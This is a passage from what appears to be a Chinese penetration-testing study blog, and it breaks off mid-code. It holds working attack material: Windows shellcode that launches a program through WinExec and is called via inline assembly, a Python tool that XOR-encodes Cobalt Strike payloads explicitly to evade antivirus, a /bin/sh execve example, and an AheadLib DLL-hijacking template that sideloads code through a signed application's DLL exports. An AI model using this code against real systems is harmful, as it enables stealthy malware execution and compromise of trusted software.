"\xeb\x54\x31\xf6\x64\x8b\x76\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x6e""\x08\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d\x78\x85\xdb\x74\xf0\x01\xeb""\x8b\x4b\x18\x67\xe3\xe8\x8b\x7b\x20\x01\xef\x8b\x7c\x8f\xfc\x01""\xef\x31\xc0\x99\x02\x17\xc1\xca\x04\xae\x75\xf8\x3b\x54\x24\x04""\xe0\xe4\x75\xca\x8b\x53\x24\x01\xea\x0f\xb7\x14\x4a\x8b\x7b\x1c""\x01\xef\x03\x2c\x97\xc3\x68\xe7\xc4\xcc\x69\xe8\xa2\xff\xff\xff""\x50\x68\x63\x61\x6c\x63\x8b\xd4\x40\x50\x52\xff\xd5\x68\x77\xa6""\x60\x2a\xe8\x8b\xff\xff\xff\x50\xff\xd5"; int main(int argc, char **argv) {_asm{lea eax, evil;//（1）call eax;//（2）}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>（1）处使用汇编指令lea把指针evil赋值给eax</li><li>（2）处使用汇编指令call直接调用寄存器eax所指向的evil函数</li></ul><pre class="line-numbers language-none"><code class="language-none">shellcode payload核心函数：00406086    68 E7C4CC69     push 0x69CCC4E70040608B    E8 A2FFFFFF     call shellcod.0040603200406090    50              push eax00406091    68 63616C63     push 0x636C616300406096    8BD4            mov edx,esp00406098    40              inc eax00406099    50              push eax0040609A    52              push edx                                 ; ntdll.KiFastSystemCallRet0040609B    FFD5            call ebp                                 ; kernel32.WinExec0040609D    68 77A6602A     push 0x2A60A677004060A2    E8 8BFFFFFF     call shellcod.00406032004060A7    50              push eax004060A8    FFD5            call ebp                                 ; kernel32.WinExec定位PEB位置00406032    31F6            xor esi,esi00406034    64:8B76 30      mov esi,dword ptr fs:[esi+0x30]00406038    8B76 0C         mov esi,dword ptr ds:[esi+0xC]0040603B    8B76 1C         mov esi,dword ptr ds:[esi+0x1C]0040603E    8B6E 08         mov ebp,dword ptr ds:[esi+0x8]00406041    8B36            mov esi,dword ptr ds:[esi]00406043    8B5D 3C         mov ebx,dword ptr ss:[ebp+0x3C]00406046    8B5C1D 78       mov ebx,dword ptr ss:[ebp+ebx+0x78]0040604A    85DB            test ebx,ebx                             ; kernel32.7C80262C0040604C  ^ 74 F0           je short shellcod.0040603E0040604E    01EB            add ebx,ebp                              ; kernel32.WinExec00406050    8B4B 18         mov ecx,dword ptr ds:[ebx+0x18]00406053    67:E3 E8        jcxz short shellcod.0040603E00406056    8B7B 20         mov edi,dword ptr ds:[ebx+0x20]00406059    01EF            add edi,ebp                              ; kernel32.WinExec0040605B    8B7C8F FC       mov edi,dword ptr ds:[edi+ecx*4-0x4]0040605F    01EF            add edi,ebp                              ; kernel32.WinExec00406061    31C0            xor eax,eax00406063    99              cdq00406064    0217            add dl,byte ptr ds:[edi]00406066    C1CA 04         ror edx,0x400406069    AE              scas byte ptr es:[edi]0040606A  ^ 75 F8           jnz short shellcod.004060640040606C    3B5424 04       cmp edx,dword ptr ss:[esp+0x4]00406070  ^ E0 E4           loopdne short shellcod.0040605600406072  ^ 75 CA           jnz short shellcod.0040603E00406074    8B53 24         mov edx,dword ptr ds:[ebx+0x24]00406077    01EA            add edx,ebp                              ; kernel32.WinExec00406079    0FB7144A        movzx edx,word ptr ds:[edx+ecx*2]0040607D    8B7B 1C         mov edi,dword ptr ds:[ebx+0x1C]00406080    01EF            add edi,ebp                              ; kernel32.WinExec00406082    032C97          add ebp,dword ptr ds:[edi+edx*4]00406085    C3              retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Shellcode-高级混淆原理（三）"><a href="#Shellcode-高级混淆原理（三）" class="headerlink" title="Shellcode 高级混淆原理（三）"></a>Shellcode 高级混淆原理（三）</h2><p>由于反病毒软件对于默认生成的文件查杀较为严格，我通常会采用混淆、加密解密的方式把载荷还原。import sys</p><pre class="line-numbers language-none"><code class="language-none">import sysfrom argparse import ArgumentParser, FileTypedef process_bin(num, src_fp, dst_fp, dst_raw):    shellcode = ''    shellcode_size = 0    shellcode_raw = b''    try:        while True:            code = src_fp.read(1)            if not code:                break            base10 = ord(code) ^ num            base10_str = chr(base10)            shellcode_raw += base10_str.encode()            code_hex = hex(base10)            code_hex = code_hex.replace('0x','')            if(len(code_hex) == 1):                code_hex = '0' + code_hex            shellcode += '\\x' + code_hex            shellcode_size += 1        src_fp.close()        dst_raw.write(shellcode_raw)        dst_raw.close()        dst_fp.write(shellcode)        dst_fp.close()        return shellcode_size    except Exception as e:        sys.stderr.writelines(str(e))def main():    parser = ArgumentParser(prog='Shellcode X', description='[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com')    parser.add_argument('-v','--version',nargs='?')    parser.add_argument('-s','--src',help=u'source bin file',type=FileType('rb'), required=True)    parser.add_argument('-d','--dst',help=u'destination shellcode file',type=FileType('w+'),required=True)    parser.add_argument('-n','--num',help=u'Confused number',type=int, default=90)    parser.add_argument('-r','--raw',help=u'output bin file', type=FileType('wb'), required=True)    args = parser.parse_args()    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)    sys.stdout.writelines("[+]Shellcode Size : {} \n".format(shellcode_size))if __name__ == "__main__":    main()命令：python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r out.bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Shellcode-高级Linux-ShellCode实践（四）"><a href="#Shellcode-高级Linux-ShellCode实践（四）" class="headerlink" title="Shellcode 高级Linux ShellCode实践（四）"></a>Shellcode 高级Linux ShellCode实践（四）</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(int argc char *argv[]){char *code[2];code[0] = "/bin/sh";code[1] = NULL;execve(code[0],code,NULL);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652062405056/e0adbd496e404817ba711483898a1c76.png" alt="image.png"></p><p>汇编代码解释：</p><ul><li>第64a<del>64e是创建一个新的栈：先将%rbp寄存器值push到原来的栈中，然后将%rbp指向原来栈的栈顶位置，形成一个新栈，将%rsp的值-0x20，就是栈顶向下增长32个字节，至于为啥这样搞，是ABI决定的。<br>第652</del>664是将数组的内容拷贝到新栈中，为啥要用-0x10(%rbp),而不用%rsp，这个我也不是很明白。其中660是将code[0]中的”/bin/sh”字符串拷到-0x10(%rbp)位置，664就是code[1]，因为是NULL，所以直接写0，为啥是0x8(%rbp)呢，因为“/bin/sh”是8个字节<br>第66c~67c是填写execve的三个参数：674是填第三个参数（因为是NULL所以为0）到%edx寄存器，674是填第二个参数，因为是char**类型，所以要填到%rsi寄存器，67c是填第一个参数到%rdi寄存器，为啥要这样同样是ABI决定，中间为啥要用%rax，%rcx寄存器，暂时没搞清。<br>最后67f就是调用execve函数了，后面的代码我们可以不看了，我们暂时不考虑函数返回的执行过程。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.12-shen-tou-guo-cheng-zhong-bai-hei-li-yong-fang-shi-xia/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.12-shen-tou-guo-cheng-zhong-bai-hei-li-yong-fang-shi-xia/</url>
      
        <content type="html"><![CDATA[<h2 id="AheadLib神器实现签名文件劫持（一）"><a href="#AheadLib神器实现签名文件劫持（一）" class="headerlink" title="AheadLib神器实现签名文件劫持（一）"></a>AheadLib神器实现签名文件劫持（一）</h2><p>AheadLib 是动态加载函数； AddExport 是函数转发，不过呢是修改编译后 dll 的方式。</p><p>函数转发没见源代码实现方式。于是，就做了这个工具，技术上基于函数转发 ，产生 C 源代码，可修改性高，操作灵活。</p><p>编译函数转发 ，完全依赖于 MSVC linker。其它编译器的 linker 不支持函数转发。</p><p>优点：导出表的无名函数不多不少，市面上的很多 AheadLib 貌似 会生成很多 不存在的 无名函数；还可以自定义即时调用函数名称前缀</p><p>使用方法：</p><p>1、生成 需要的 CPP 文件<br>2、在 CPP 文件中 添加 pch.h(如果需要)、Windows.h(如果需要) 头文件<br>3、修改 namespace AheadLib 部分，把 “c:\windows\test.dll” 修改为 你要劫持 的 dll 路径，比如：”c:\windows\syswow64\WindowsCodecs.dll”<br>4、输出表中：DllGetClassObject 这类 编译标记为 “PRIVATE” 警告 的 函数 直接 删掉(当做 从没有出现在 输出表中 即可)</p><p>举例来说：</p><p>主程序 test_dll.c</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int __cdecl    _e (int x);int __cdecl    f (int x);int __stdcall  g (int x);int __fastcall h (int x);int main(int argc, char **argv){printf("%d\n", _e(1));printf("%d\n", f(2));printf("%d\n", g(3));printf("%d\n", h(4));return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;__declspec(dllexport) int __cdecl    _e (int x) { return x; }__declspec(dllexport) int __cdecl    f (int x) { return x; }__declspec(dllexport) int __stdcall  g (int x) { return x; }__declspec(dllexport) int __fastcall h (int x) { return x; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译后，产生可运行的 test_dll. exe 和 name_mangling.dll。</p><p>使用工具，可根据 name_mangling.dll 产生 name_mangling~.c</p><pre class="line-numbers language-none"><code class="language-none">// Created by hijackdll-helper/* There should be dll hijacking possible first! *//* cl.exe /Os /GD /LD /Fe *//* https://en.wikipedia.org/wiki/Name_mangling */ #include &lt;windows.h&gt; /*  Don't forward to itself!    "C:\Windows\System32\version" is acceptable ;p*/#define HIJACKED_DLL_NAME "name_mangling_"    //&lt;--- modify /* gcc does't support this. */#pragma comment(linker, "/EXPORT:__e="HIJACKED_DLL_NAME"._e,@1")#pragma comment(linker, "/EXPORT:_g@4="HIJACKED_DLL_NAME"._g@4,@2")#pragma comment(linker, "/EXPORT:f="HIJACKED_DLL_NAME".f,@3")#pragma comment(linker, "/EXPORT:h="HIJACKED_DLL_NAME".h,@4")  // Add your implementations here, and comment the forwarders &lt;--- extern int sideload();    //&lt;--- /*  Less dependencies: _DllMainCRTStartup    More functions: DllMain    Take care of the core libs yourself: msvcrt, kernel32, ntdll, user32 */BOOL WINAPI _DllMainCRTStartup(HMODULE hModule, DWORD dwReason, PVOID pvReserved){    switch (dwReason) {    case DLL_PROCESS_ATTACH:        sideload();    //&lt;---        break;    /*    case DLL_PROCESS_DETACH:        break;    case DLL_THREAD_ATTACH:        break;    case DLL_THREAD_DETACH:        break;    */    }    return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="AheadLib神器实现签名文件劫持（二）"><a href="#AheadLib神器实现签名文件劫持（二）" class="headerlink" title="AheadLib神器实现签名文件劫持（二）"></a>AheadLib神器实现签名文件劫持（二）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651801074074/73b54a4e12e84aeb8ad3e7e8e06ea435.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">//////////////////////////////////////////////////////////////////////////////////////// 导出函数#pragma comment(linker, "/EXPORT:NoName2=_AheadLib_NoName2,@2,NONAME")#pragma comment(linker, "/EXPORT:CloseDriver=_AheadLib_CloseDriver,@3")#pragma comment(linker, "/EXPORT:DefDriverProc=_AheadLib_DefDriverProc,@4")#pragma comment(linker, "/EXPORT:DriverCallback=_AheadLib_DriverCallback,@5")#pragma comment(linker, "/EXPORT:DrvGetModuleHandle=_AheadLib_DrvGetModuleHandle,@6")#pragma comment(linker, "/EXPORT:GetDriverModuleHandle=_AheadLib_GetDriverModuleHandle,@7")#pragma comment(linker, "/EXPORT:NotifyCallbackData=_AheadLib_NotifyCallbackData,@8")#pragma comment(linker, "/EXPORT:OpenDriver=_AheadLib_OpenDriver,@9")#pragma comment(linker, "/EXPORT:PlaySound=_AheadLib_PlaySound,@10")#pragma comment(linker, "/EXPORT:PlaySoundA=_AheadLib_PlaySoundA,@11")#pragma comment(linker, "/EXPORT:PlaySoundW=_AheadLib_PlaySoundW,@12")#pragma comment(linker, "/EXPORT:SendDriverMessage=_AheadLib_SendDriverMessage,@13")#pragma comment(linker, "/EXPORT:WOW32DriverCallback=_AheadLib_WOW32DriverCallback,@14")#pragma comment(linker, "/EXPORT:WOW32ResolveMultiMediaHandle=_AheadLib_WOW32ResolveMultiMediaHandle,@15")#pragma comment(linker, "/EXPORT:WOWAppExit=_AheadLib_WOWAppExit,@16")#pragma comment(linker, "/EXPORT:aux32Message=_AheadLib_aux32Message,@17")#pragma comment(linker, "/EXPORT:auxGetDevCapsA=_AheadLib_auxGetDevCapsA,@18")#pragma comment(linker, "/EXPORT:auxGetDevCapsW=_AheadLib_auxGetDevCapsW,@19")#pragma comment(linker, "/EXPORT:auxGetNumDevs=_AheadLib_auxGetNumDevs,@20")#pragma comment(linker, "/EXPORT:auxGetVolume=_AheadLib_auxGetVolume,@21")#pragma comment(linker, "/EXPORT:auxOutMessage=_AheadLib_auxOutMessage,@22")#pragma comment(linker, "/EXPORT:auxSetVolume=_AheadLib_auxSetVolume,@23")#pragma comment(linker, "/EXPORT:joy32Message=_AheadLib_joy32Message,@24")#pragma comment(linker, "/EXPORT:joyConfigChanged=_AheadLib_joyConfigChanged,@25")#pragma comment(linker, "/EXPORT:joyGetDevCapsA=_AheadLib_joyGetDevCapsA,@26")#pragma comment(linker, "/EXPORT:joyGetDevCapsW=_AheadLib_joyGetDevCapsW,@27")#pragma comment(linker, "/EXPORT:joyGetNumDevs=_AheadLib_joyGetNumDevs,@28")#pragma comment(linker, "/EXPORT:joyGetPos=_AheadLib_joyGetPos,@29")#pragma comment(linker, "/EXPORT:joyGetPosEx=_AheadLib_joyGetPosEx,@30")#pragma comment(linker, "/EXPORT:joyGetThreshold=_AheadLib_joyGetThreshold,@31")#pragma comment(linker, "/EXPORT:joyReleaseCapture=_AheadLib_joyReleaseCapture,@32")#pragma comment(linker, "/EXPORT:joySetCapture=_AheadLib_joySetCapture,@33")#pragma comment(linker, "/EXPORT:joySetThreshold=_AheadLib_joySetThreshold,@34")#pragma comment(linker, "/EXPORT:mci32Message=_AheadLib_mci32Message,@35")#pragma comment(linker, "/EXPORT:mciDriverNotify=_AheadLib_mciDriverNotify,@36")#pragma comment(linker, "/EXPORT:mciDriverYield=_AheadLib_mciDriverYield,@37")#pragma comment(linker, "/EXPORT:mciExecute=_AheadLib_mciExecute,@38")#pragma comment(linker, "/EXPORT:mciFreeCommandResource=_AheadLib_mciFreeCommandResource,@39")#pragma comment(linker, "/EXPORT:mciGetCreatorTask=_AheadLib_mciGetCreatorTask,@40")#pragma comment(linker, "/EXPORT:mciGetDeviceIDA=_AheadLib_mciGetDeviceIDA,@41")#pragma comment(linker, "/EXPORT:mciGetDeviceIDFromElementIDA=_AheadLib_mciGetDeviceIDFromElementIDA,@42")#pragma comment(linker, "/EXPORT:mciGetDeviceIDFromElementIDW=_AheadLib_mciGetDeviceIDFromElementIDW,@43")#pragma comment(linker, "/EXPORT:mciGetDeviceIDW=_AheadLib_mciGetDeviceIDW,@44")#pragma comment(linker, "/EXPORT:mciGetDriverData=_AheadLib_mciGetDriverData,@45")#pragma comment(linker, "/EXPORT:mciGetErrorStringA=_AheadLib_mciGetErrorStringA,@46")#pragma comment(linker, "/EXPORT:mciGetErrorStringW=_AheadLib_mciGetErrorStringW,@47")#pragma comment(linker, "/EXPORT:mciGetYieldProc=_AheadLib_mciGetYieldProc,@48")#pragma comment(linker, "/EXPORT:mciLoadCommandResource=_AheadLib_mciLoadCommandResource,@49")#pragma comment(linker, "/EXPORT:mciSendCommandA=_AheadLib_mciSendCommandA,@50")#pragma comment(linker, "/EXPORT:mciSendCommandW=_AheadLib_mciSendCommandW,@51")#pragma comment(linker, "/EXPORT:mciSendStringA=_AheadLib_mciSendStringA,@52")#pragma comment(linker, "/EXPORT:mciSendStringW=_AheadLib_mciSendStringW,@53")#pragma comment(linker, "/EXPORT:mciSetDriverData=_AheadLib_mciSetDriverData,@54")#pragma comment(linker, "/EXPORT:mciSetYieldProc=_AheadLib_mciSetYieldProc,@55")#pragma comment(linker, "/EXPORT:mid32Message=_AheadLib_mid32Message,@56")#pragma comment(linker, "/EXPORT:midiConnect=_AheadLib_midiConnect,@57")#pragma comment(linker, "/EXPORT:midiDisconnect=_AheadLib_midiDisconnect,@58")#pragma comment(linker, "/EXPORT:midiInAddBuffer=_AheadLib_midiInAddBuffer,@59")#pragma comment(linker, "/EXPORT:midiInClose=_AheadLib_midiInClose,@60")#pragma comment(linker, "/EXPORT:midiInGetDevCapsA=_AheadLib_midiInGetDevCapsA,@61")#pragma comment(linker, "/EXPORT:midiInGetDevCapsW=_AheadLib_midiInGetDevCapsW,@62")#pragma comment(linker, "/EXPORT:midiInGetErrorTextA=_AheadLib_midiInGetErrorTextA,@63")#pragma comment(linker, "/EXPORT:midiInGetErrorTextW=_AheadLib_midiInGetErrorTextW,@64")#pragma comment(linker, "/EXPORT:midiInGetID=_AheadLib_midiInGetID,@65")#pragma comment(linker, "/EXPORT:midiInGetNumDevs=_AheadLib_midiInGetNumDevs,@66")#pragma comment(linker, "/EXPORT:midiInMessage=_AheadLib_midiInMessage,@67")#pragma comment(linker, "/EXPORT:midiInOpen=_AheadLib_midiInOpen,@68")#pragma comment(linker, "/EXPORT:midiInPrepareHeader=_AheadLib_midiInPrepareHeader,@69")#pragma comment(linker, "/EXPORT:midiInReset=_AheadLib_midiInReset,@70")#pragma comment(linker, "/EXPORT:midiInStart=_AheadLib_midiInStart,@71")#pragma comment(linker, "/EXPORT:midiInStop=_AheadLib_midiInStop,@72")#pragma comment(linker, "/EXPORT:midiInUnprepareHeader=_AheadLib_midiInUnprepareHeader,@73")#pragma comment(linker, "/EXPORT:midiOutCacheDrumPatches=_AheadLib_midiOutCacheDrumPatches,@74")#pragma comment(linker, "/EXPORT:midiOutCachePatches=_AheadLib_midiOutCachePatches,@75")#pragma comment(linker, "/EXPORT:midiOutClose=_AheadLib_midiOutClose,@76")#pragma comment(linker, "/EXPORT:midiOutGetDevCapsA=_AheadLib_midiOutGetDevCapsA,@77")#pragma comment(linker, "/EXPORT:midiOutGetDevCapsW=_AheadLib_midiOutGetDevCapsW,@78")#pragma comment(linker, "/EXPORT:midiOutGetErrorTextA=_AheadLib_midiOutGetErrorTextA,@79")#pragma comment(linker, "/EXPORT:midiOutGetErrorTextW=_AheadLib_midiOutGetErrorTextW,@80")#pragma comment(linker, "/EXPORT:midiOutGetID=_AheadLib_midiOutGetID,@81")#pragma comment(linker, "/EXPORT:midiOutGetNumDevs=_AheadLib_midiOutGetNumDevs,@82")#pragma comment(linker, "/EXPORT:midiOutGetVolume=_AheadLib_midiOutGetVolume,@83")#pragma comment(linker, "/EXPORT:midiOutLongMsg=_AheadLib_midiOutLongMsg,@84")#pragma comment(linker, "/EXPORT:midiOutMessage=_AheadLib_midiOutMessage,@85")#pragma comment(linker, "/EXPORT:midiOutOpen=_AheadLib_midiOutOpen,@86")#pragma comment(linker, "/EXPORT:midiOutPrepareHeader=_AheadLib_midiOutPrepareHeader,@87")#pragma comment(linker, "/EXPORT:midiOutReset=_AheadLib_midiOutReset,@88")#pragma comment(linker, "/EXPORT:midiOutSetVolume=_AheadLib_midiOutSetVolume,@89")#pragma comment(linker, "/EXPORT:midiOutShortMsg=_AheadLib_midiOutShortMsg,@90")#pragma comment(linker, "/EXPORT:midiOutUnprepareHeader=_AheadLib_midiOutUnprepareHeader,@91")#pragma comment(linker, "/EXPORT:midiStreamClose=_AheadLib_midiStreamClose,@92")#pragma comment(linker, "/EXPORT:midiStreamOpen=_AheadLib_midiStreamOpen,@93")#pragma comment(linker, "/EXPORT:midiStreamOut=_AheadLib_midiStreamOut,@94")#pragma comment(linker, "/EXPORT:midiStreamPause=_AheadLib_midiStreamPause,@95")#pragma comment(linker, "/EXPORT:midiStreamPosition=_AheadLib_midiStreamPosition,@96")#pragma comment(linker, "/EXPORT:midiStreamProperty=_AheadLib_midiStreamProperty,@97")#pragma comment(linker, "/EXPORT:midiStreamRestart=_AheadLib_midiStreamRestart,@98")#pragma comment(linker, "/EXPORT:midiStreamStop=_AheadLib_midiStreamStop,@99")#pragma comment(linker, "/EXPORT:mixerClose=_AheadLib_mixerClose,@100")#pragma comment(linker, "/EXPORT:mixerGetControlDetailsA=_AheadLib_mixerGetControlDetailsA,@101")#pragma comment(linker, "/EXPORT:mixerGetControlDetailsW=_AheadLib_mixerGetControlDetailsW,@102")#pragma comment(linker, "/EXPORT:mixerGetDevCapsA=_AheadLib_mixerGetDevCapsA,@103")#pragma comment(linker, "/EXPORT:mixerGetDevCapsW=_AheadLib_mixerGetDevCapsW,@104")#pragma comment(linker, "/EXPORT:mixerGetID=_AheadLib_mixerGetID,@105")#pragma comment(linker, "/EXPORT:mixerGetLineControlsA=_AheadLib_mixerGetLineControlsA,@106")#pragma comment(linker, "/EXPORT:mixerGetLineControlsW=_AheadLib_mixerGetLineControlsW,@107")#pragma comment(linker, "/EXPORT:mixerGetLineInfoA=_AheadLib_mixerGetLineInfoA,@108")#pragma comment(linker, "/EXPORT:mixerGetLineInfoW=_AheadLib_mixerGetLineInfoW,@109")#pragma comment(linker, "/EXPORT:mixerGetNumDevs=_AheadLib_mixerGetNumDevs,@110")#pragma comment(linker, "/EXPORT:mixerMessage=_AheadLib_mixerMessage,@111")#pragma comment(linker, "/EXPORT:mixerOpen=_AheadLib_mixerOpen,@112")#pragma comment(linker, "/EXPORT:mixerSetControlDetails=_AheadLib_mixerSetControlDetails,@113")#pragma comment(linker, "/EXPORT:mmDrvInstall=_AheadLib_mmDrvInstall,@114")#pragma comment(linker, "/EXPORT:mmGetCurrentTask=_AheadLib_mmGetCurrentTask,@115")#pragma comment(linker, "/EXPORT:mmTaskBlock=_AheadLib_mmTaskBlock,@116")#pragma comment(linker, "/EXPORT:mmTaskCreate=_AheadLib_mmTaskCreate,@117")#pragma comment(linker, "/EXPORT:mmTaskSignal=_AheadLib_mmTaskSignal,@118")#pragma comment(linker, "/EXPORT:mmTaskYield=_AheadLib_mmTaskYield,@119")#pragma comment(linker, "/EXPORT:mmioAdvance=_AheadLib_mmioAdvance,@120")#pragma comment(linker, "/EXPORT:mmioAscend=_AheadLib_mmioAscend,@121")#pragma comment(linker, "/EXPORT:mmioClose=_AheadLib_mmioClose,@122")#pragma comment(linker, "/EXPORT:mmioCreateChunk=_AheadLib_mmioCreateChunk,@123")#pragma comment(linker, "/EXPORT:mmioDescend=_AheadLib_mmioDescend,@124")#pragma comment(linker, "/EXPORT:mmioFlush=_AheadLib_mmioFlush,@125")#pragma comment(linker, "/EXPORT:mmioGetInfo=_AheadLib_mmioGetInfo,@126")#pragma comment(linker, "/EXPORT:mmioInstallIOProcA=_AheadLib_mmioInstallIOProcA,@127")#pragma comment(linker, "/EXPORT:mmioInstallIOProcW=_AheadLib_mmioInstallIOProcW,@128")#pragma comment(linker, "/EXPORT:mmioOpenA=_AheadLib_mmioOpenA,@129")#pragma comment(linker, "/EXPORT:mmioOpenW=_AheadLib_mmioOpenW,@130")#pragma comment(linker, "/EXPORT:mmioRead=_AheadLib_mmioRead,@131")#pragma comment(linker, "/EXPORT:mmioRenameA=_AheadLib_mmioRenameA,@132")#pragma comment(linker, "/EXPORT:mmioRenameW=_AheadLib_mmioRenameW,@133")#pragma comment(linker, "/EXPORT:mmioSeek=_AheadLib_mmioSeek,@134")#pragma comment(linker, "/EXPORT:mmioSendMessage=_AheadLib_mmioSendMessage,@135")#pragma comment(linker, "/EXPORT:mmioSetBuffer=_AheadLib_mmioSetBuffer,@136")#pragma comment(linker, "/EXPORT:mmioSetInfo=_AheadLib_mmioSetInfo,@137")#pragma comment(linker, "/EXPORT:mmioStringToFOURCCA=_AheadLib_mmioStringToFOURCCA,@138")#pragma comment(linker, "/EXPORT:mmioStringToFOURCCW=_AheadLib_mmioStringToFOURCCW,@139")#pragma comment(linker, "/EXPORT:mmioWrite=_AheadLib_mmioWrite,@140")#pragma comment(linker, "/EXPORT:mmsystemGetVersion=_AheadLib_mmsystemGetVersion,@141")#pragma comment(linker, "/EXPORT:mod32Message=_AheadLib_mod32Message,@142")#pragma comment(linker, "/EXPORT:mxd32Message=_AheadLib_mxd32Message,@143")#pragma comment(linker, "/EXPORT:sndPlaySoundA=_AheadLib_sndPlaySoundA,@144")#pragma comment(linker, "/EXPORT:sndPlaySoundW=_AheadLib_sndPlaySoundW,@145")#pragma comment(linker, "/EXPORT:tid32Message=_AheadLib_tid32Message,@146")#pragma comment(linker, "/EXPORT:timeBeginPeriod=_AheadLib_timeBeginPeriod,@147")#pragma comment(linker, "/EXPORT:timeEndPeriod=_AheadLib_timeEndPeriod,@148")#pragma comment(linker, "/EXPORT:timeGetDevCaps=_AheadLib_timeGetDevCaps,@149")#pragma comment(linker, "/EXPORT:timeGetSystemTime=_AheadLib_timeGetSystemTime,@150")#pragma comment(linker, "/EXPORT:timeGetTime=_AheadLib_timeGetTime,@151")#pragma comment(linker, "/EXPORT:timeKillEvent=_AheadLib_timeKillEvent,@152")#pragma comment(linker, "/EXPORT:timeSetEvent=_AheadLib_timeSetEvent,@153")#pragma comment(linker, "/EXPORT:waveInAddBuffer=_AheadLib_waveInAddBuffer,@154")#pragma comment(linker, "/EXPORT:waveInClose=_AheadLib_waveInClose,@155")#pragma comment(linker, "/EXPORT:waveInGetDevCapsA=_AheadLib_waveInGetDevCapsA,@156")#pragma comment(linker, "/EXPORT:waveInGetDevCapsW=_AheadLib_waveInGetDevCapsW,@157")#pragma comment(linker, "/EXPORT:waveInGetErrorTextA=_AheadLib_waveInGetErrorTextA,@158")#pragma comment(linker, "/EXPORT:waveInGetErrorTextW=_AheadLib_waveInGetErrorTextW,@159")#pragma comment(linker, "/EXPORT:waveInGetID=_AheadLib_waveInGetID,@160")#pragma comment(linker, "/EXPORT:waveInGetNumDevs=_AheadLib_waveInGetNumDevs,@161")#pragma comment(linker, "/EXPORT:waveInGetPosition=_AheadLib_waveInGetPosition,@162")#pragma comment(linker, "/EXPORT:waveInMessage=_AheadLib_waveInMessage,@163")#pragma comment(linker, "/EXPORT:waveInOpen=_AheadLib_waveInOpen,@164")#pragma comment(linker, "/EXPORT:waveInPrepareHeader=_AheadLib_waveInPrepareHeader,@165")#pragma comment(linker, "/EXPORT:waveInReset=_AheadLib_waveInReset,@166")#pragma comment(linker, "/EXPORT:waveInStart=_AheadLib_waveInStart,@167")#pragma comment(linker, "/EXPORT:waveInStop=_AheadLib_waveInStop,@168")#pragma comment(linker, "/EXPORT:waveInUnprepareHeader=_AheadLib_waveInUnprepareHeader,@169")#pragma comment(linker, "/EXPORT:waveOutBreakLoop=_AheadLib_waveOutBreakLoop,@170")#pragma comment(linker, "/EXPORT:waveOutClose=_AheadLib_waveOutClose,@171")#pragma comment(linker, "/EXPORT:waveOutGetDevCapsA=_AheadLib_waveOutGetDevCapsA,@172")#pragma comment(linker, "/EXPORT:waveOutGetDevCapsW=_AheadLib_waveOutGetDevCapsW,@173")#pragma comment(linker, "/EXPORT:waveOutGetErrorTextA=_AheadLib_waveOutGetErrorTextA,@174")#pragma comment(linker, "/EXPORT:waveOutGetErrorTextW=_AheadLib_waveOutGetErrorTextW,@175")#pragma comment(linker, "/EXPORT:waveOutGetID=_AheadLib_waveOutGetID,@176")#pragma comment(linker, "/EXPORT:waveOutGetNumDevs=_AheadLib_waveOutGetNumDevs,@177")#pragma comment(linker, "/EXPORT:waveOutGetPitch=_AheadLib_waveOutGetPitch,@178")#pragma comment(linker, "/EXPORT:waveOutGetPlaybackRate=_AheadLib_waveOutGetPlaybackRate,@179")#pragma comment(linker, "/EXPORT:waveOutGetPosition=_AheadLib_waveOutGetPosition,@180")#pragma comment(linker, "/EXPORT:waveOutGetVolume=_AheadLib_waveOutGetVolume,@181")#pragma comment(linker, "/EXPORT:waveOutMessage=_AheadLib_waveOutMessage,@182")#pragma comment(linker, 